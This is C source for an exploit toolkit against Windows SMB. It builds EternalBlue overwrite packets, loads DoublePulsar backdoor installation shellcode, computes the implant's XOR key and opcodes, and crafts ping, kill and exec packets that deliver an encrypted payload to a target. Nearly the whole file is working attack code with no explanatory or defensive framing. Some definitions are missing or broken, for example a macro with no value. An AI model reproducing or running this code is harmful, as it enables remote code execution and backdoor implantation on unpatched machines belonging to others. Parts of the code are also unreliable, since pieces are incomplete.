#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>

#pragma pack(push, 1)

typedef struct _REQ_TRANSACTION2_SECONDARY {
	BYTE WordCount;
	WORD TotalParameterCount;
	WORD TotalDataCount;
	WORD ParameterCount;
	WORD ParameterOffset;
	WORD ParameterDisplacement;
	WORD DataCount;
	WORD DataOffset;
	WORD DataDisplacement;
	WORD FID;
	WORD ByteCount;
	BYTE Buffer[1];
}REQ_TRANSACTION2_SECONDARY, * PREQ_TRANSACTION2_SECONDARY;

#pragma pack(pop)

#define SMB_COM_NEGOTIATE				0x72
#define SMB_COM_SESSION_SETUP_ANDX		0x73
#define SMB_COM_TREE_CONNECT			0x75
#define SMB_COM_TRANS					0x25
#define SMB_COM_TRANS_SECONDARY			0x26
#define SMB_COM_TRANS2					0x32
#define SMB_COM_TRANS2_SECONDARY


DWORD __stdcall GetDoublePulsarStatusCode(BUFFER* IN bws, BUFFER IN* request)
{
	DWORD status = 0;
	PSMB_HEADER smbresp = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET), smbreq = MAKEPSMB(request->pbdata + SMB_PARAM_OFFSET);
	PRESP_TRANSACTION2 trans2resp = (PRESP_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);
	PREQ_TRANSACTION2 trans2req = (PREQ_TRANSACTION2)(request->pbdata + SMB_PARAM_OFFSET);

	status = (DWORD)(GetUshort(&smbresp->Mid) - GetUshort(&smbreq->Mid));
	status &= 0xFFUL;

	return status;
}

DWORD __stdcall GetDoublePulsarOpCode(BUFFER* IN bws)
{
	DWORD opcode = 0, t = 0;
	PREQ_TRANSACTION2 trans2 = (PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUlong(&t, GetUlong(&trans2->Timeout));
	opcode = ((t)+(t >> 8) + (t >> 16) + (t >> 24));

	return (opcode & 0xFF);
}

BOOL __stdcall GenerateDoublePulsarOpcodePacket(BUFFER* IN OUT bws, BYTE opcode)
{
	DWORD op = 0, k = 0, t = 0;
	PREQ_TRANSACTION2 trans2 = NULL;
	PSMB_HEADER smb = NULL;

	op = opcode;
	//PutUnsigned(&k, random());
	csprng(MAKEPBYTE(&k), sizeof(k));
	t = 0xFF & (op - ((k & 0xFFFF00) >> 16) - (0xFFFF & (k & 0xFF00) >> 8)) | k & 0xFFFF00;


	smb = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans2 = (PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);
	PutUlong(&trans2->Timeout, GetUlong(&t));

	if (!cmp(smb->Protocol, "\xFFSMB", 4))
		return FALSE;
	else
		return TRUE;
}

DWORD __stdcall GetDoublePulsarXorKey(BUFFER* IN bws)
{
	ULONGLONG s = 0;
	ULARGE_INTEGER x = { 0 };
	PSMB_HEADER smb = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);

	s = byteswap64(GetUlonglong(smb->SecuritySignature));
	s = GetUlonglong(smb->SecuritySignature);

	x.QuadPart = (2 * s ^ (((s & 0xFF00 | (s << 16)) << 8) | (((s >> 16) | s & 0xFF0000) >> 8)));

	return (x.LowPart & 0xFFFFFFFF);
}


BOOL __stdcall XorEncryptPayload(BUFFER IN OUT* payload, DWORD IN xorkey)
{
	static BUFFER tmp;
	DWORD doublewordsize = 0, remainder = 0, * dwptr = NULL, i = 0;

	if (isnull(payload) || !GetUlong(&xorkey))
		return FALSE;

	if (payload->dwsize % 0x1000)
		return FALSE;

	doublewordsize = (payload->dwsize / sizeof(DWORD));
	dwptr = MAKEPDWORD(payload->pbdata);

	for (i = 0; i < doublewordsize; i++)
		dwptr[i] ^= xorkey;

	return TRUE;
}

WORD get_pid(smb_info* i)
{
	return GetUshort(&i->pid);
}

WORD get_uid(smb_info* i)
{
	return GetUshort(&i->uid);
}

WORD get_mid(smb_info* i)
{
	return GetUshort(&i->mid);
}

WORD get_tid(smb_info* i)
{
	return GetUshort(&i->tid);
}

WORD get_fid(smb_info* i)
{
	return GetUshort(&i->fid);
}

WORD get_special_mid(smb_info* i)
{
	return GetUshort(&i->special_mid);
}

WORD get_special_pid(smb_info* i)
{
	return GetUshort(&i->special_pid);
}

WORD get_datadisplacement(smb_info* i)
{
	return GetUshort(&i->DataDisplacement);
}


void set_pid(smb_info* i, WORD pid)
{
	PutUshort(&i->pid, pid);
}

void set_uid(smb_info* i, WORD uid)
{
	PutUshort(&i->uid, uid);
}

void set_mid(smb_info* i, WORD mid)
{
	PutUshort(&i->mid, mid);
}

void set_tid(smb_info* i, WORD tid)
{
	PutUshort(&i->tid, tid);
}

void set_fid(smb_info* i, WORD fid)
{
	PutUshort(&i->fid, fid);
}

void set_special_mid(smb_info* i, WORD special_mid)
{
	PutUshort(&i->special_mid, special_mid);
}

void set_special_pid(smb_info* i, WORD special_pid)
{
	PutUshort(&i->special_pid, special_pid);
}

void set_datadisplacement(smb_info* i, WORD datadisplacement)
{
	PutUshort(&i->DataDisplacement, datadisplacement);
}


void bwsalloc(BUFFER OUT* bws, DWORD IN size)
{
	SIZE_T siz = size;
	*bws = { 0 };
	bws->dwsize += size;
#ifdef EXEC_ALLOC
	bws->pbdata = MAKEPBYTE(VirtualAlloc(NULL, siz, MEM_COMMIT, PAGE_EXECUTE_READWRITE));
#else
	bws->pbdata = MAKEPBYTE(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, siz));
#endif // EXEC_ALLOC

	if (isnull(bws->pbdata))
	{
		errmsg(__FUNCSIG__, __LINE__, GetLastError() | STATUS_NO_MEMORY);
		return;
	}

	RtlZeroMemory(bws->pbdata, siz);
	return;
}

void bwsfree(BUFFER IN* bws)
{
#ifdef EXEC_ALLOC
	if (notnull(bws->pbdata))
		if (!VirtualFree(bws->pbdata, 0, MEM_RELEASE))
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
#else
	if (notnull(bws->pbdata))
		if (!HeapFree(GetProcessHeap(), 0, bws->pbdata))
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
#endif // EXEC_ALLOC
	RtlZeroMemory(bws, sizeof(BUFFER));
	return;
}

PBYTE doublepulsar_installation_shellcode(BUFFER IN OUT* bws)
{
	bwsalloc(bws, NETBIOS_SESSION_SERVICE_DOUBLE_PULSAR_SHELLCODE_SIZE);
	cpy(bws->pbdata, NETBIOS_SESSION_SERVICE_DOUBLE_PULSAR_SHELLCODE, bws->dwsize);

	return bws->pbdata;
}


PBYTE trans2_secondary_fid_zero_eternalblue_overwrite_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid, WORD DataDisplacement)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION2_SECONDARY trans = NULL;

	bwsalloc(bws, TRANS2_SECONDARY_FID_ZERO_ETERNALBLUE_OVERWRITE_PACKET_SIZE);
	cpy(bws->pbdata, TRANS2_SECONDARY_FID_ZERO_ETERNALBLUE_OVERWRITE_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = (PREQ_TRANSACTION2_SECONDARY)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	PutUshort(&trans->DataDisplacement, DataDisplacement);

	return bws->pbdata;
}



PBYTE trans2_session_setup_dopu_ping(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	HMODULE lib = NULL;
	packet_creation_handler_type_one create_packet = NULL;

	lib = SmbLibraryInitialize();
	if (isnull(lib))
		return FALSE;
	
	create_packet = (packet_creation_handler_type_one)GetProcAddress(lib, "trans2_session_setup_dopu_ping");
	if (isnull(create_packet))
		return FALSE;

	return create_packet(bws, pid, uid, mid, tid);
}

PBYTE trans2_session_setup_dopu_kill(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	HMODULE lib = NULL;
	packet_creation_handler_type_one create_packet = NULL;

	lib = SmbLibraryInitialize();
	create_packet = (packet_creation_handler_type_one)GetProcAddress(lib, "trans2_session_setup_dopu_kill");

	if (isnull(lib) || isnull(create_packet))
		return FALSE;

	return create_packet(bws, pid, uid, mid, tid);
}

PBYTE trans2_session_setup_dopu_exec(BUFFER IN OUT* bws, BUFFER IN* xorkeypacket, BUFFER IN* payload, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	HMODULE lib = NULL;
	packet_creation_handler_type_six create_packet = NULL;
	
	lib = SmbLibraryInitialize();
	
	if (isnull(lib))
		return NULL;

	create_packet = (packet_creation_handler_type_six)GetProcAddress(lib, "trans2_session_setup_dopu_exec");

	if (isnull(create_packet))
		return NULL;

	return create_packet(bws, xorkeypacket, payload, pid, uid, mid, tid);
}


PBYTE tree_disconnect_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PRESP_TRANSACTION_INTERIM treedisconnect = NULL;

	bwsalloc(bws, DOUBLE_PULSAR_TREE_DISCONNECT_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_TREE_DISCONNECT_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	treedisconnect = (PRESP_TRANSACTION_INTERIM)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE logoff_andx_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;

	bwsalloc(bws, DOUBLE_PULSAR_LOGOFF_ANDX_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_LOGOFF_ANDX_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}










